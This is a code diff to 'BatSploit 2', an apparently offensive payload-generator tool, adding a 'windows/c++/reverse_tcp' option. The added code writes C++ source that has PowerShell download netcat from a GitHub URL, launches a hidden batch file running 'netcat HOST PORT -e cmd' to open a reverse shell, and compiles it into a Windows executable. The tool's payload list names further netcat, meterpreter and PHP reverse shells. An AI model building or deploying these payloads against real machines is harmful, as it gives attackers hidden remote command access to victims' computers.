@@ -15,6 +15,9 @@ try:
 	from colorama import init
 	from termcolor import colored
 	init()
+	if os.path.exists("cpp/bin") == False:
+		sys.stdout.write("[!] Some modules needed to use BatSploit 2\n[*] Run : setup.py\n")
+		sys.exit()
 except ImportError:
 	sys.stdout.write("[!] Some modules needed to use BatSploit 2\n[*] Run : setup.py\n")
 	sys.exit()
@@ -43,6 +46,7 @@ class BatSploit(object):
 		#sys.stdout.write(colored(" << << << <<    \ `--'  /---)\n", "white"))
 		#sys.stdout.write(colored("            ^  ^  ^  ^     `-.....--'''\n", "white"))
 		print ""
+		print colored("# cosway ...", "green")
 		print colored(" _____________", "white")
 		print colored("<", "white") + colored(" BatSploit 2 ", "green") + colored(">", "white")
 		print colored(" -------------", "white")
@@ -100,7 +104,7 @@ class BatSploit(object):
 	def list_payloads(self):
 		# essa função lista os payloads
 		print "\n[!] Payloads List"
-		payloads = ['python/netcat/reverse_tcp', 'python/batsploit/reverse_tcp', 'python/meterpreter/reverse_tcp', 'windows/netcat/reverse_tcp', 'linux/netcat/reverse_tcp', 'php/socket/reverse_tcp', 'php/netcat/reverse_tcp', 'php/meterpreter/reverse_tcp', 'ruby/netcat/reverse_tcp'] # tupple contendo os payloads
+		payloads = ['python/netcat/reverse_tcp', 'python/batsploit/reverse_tcp', 'python/meterpreter/reverse_tcp', 'windows/netcat/reverse_tcp', 'windows/c++/reverse_tcp', 'linux/netcat/reverse_tcp', 'php/socket/reverse_tcp', 'php/netcat/reverse_tcp', 'php/meterpreter/reverse_tcp', 'ruby/netcat/reverse_tcp'] # tupple contendo os payloads
 		for payload in payloads:
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored(payload, "white"))
@@ -413,3 +417,42 @@ class BatSploit(object):
 				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
 				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+		elif payload == 'windows/c++/reverse_tcp':
+			# code ...
+			url = "'https://github.com/proxyanon/BatSploit/raw/master/nc.exe'"
+			url_save = "'netcat.exe'"
+			code = "#include <iostream>\n"
+			code += "#include <stdio.h>\n"
+			code += "#include <stdlib.h>\n\n"
+			code += "int main()\n"
+			code += '{\n	system("@echo off && mode 20, 10 && color 7f");\n'
+			code += 'system("echo  powershell (New-Object System.Net.WebClient).DownloadFile('+url+','+url_save+') > %temp%/bd.bat");'
+			code += '\n	system("echo netcat '+host+' '+str(port)+' -e cmd >> %temp%/bd.bat");\n'
+			code += '	system("cd %temp% && powershell -W hidden ./bd.bat");\n'
+			code += '	return 0;\n'
+			code += "}"
+			payload_file = open(name, 'w') # abri o arquivo dst
+			payload_file.write(code) # escreve o código no arquivo
+			payload_file.close() # fecha o arquivo
+			name_payload = name.split('.')[0]
+			ext_payload = name.split('.')[0]
+			new_name = name_payload + ".exe"
+			size_payload = os.path.getsize(name) # tamanho do payload
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Path : compiled/%s\n"%(new_name), "white"))
+			if self.platform == "Windows":
+				bin_ = os.path.abspath('cpp\\bin\\mingw32-c++.exe') # path do compilador de C
+				os.system('@echo off && cd cpp/bin && "%s" -static-libgcc -static-libstdc++ ../../%s -o ../../compiled/%s && cd ../../ && del %s'%(bin_,name,new_name,name)) # compila para qualquer windows rodar
+			elif self.platform == "Linux":
+				os.system("i586-mingw32msvc-gcc %s -o %s"%(name,new_name))
+	
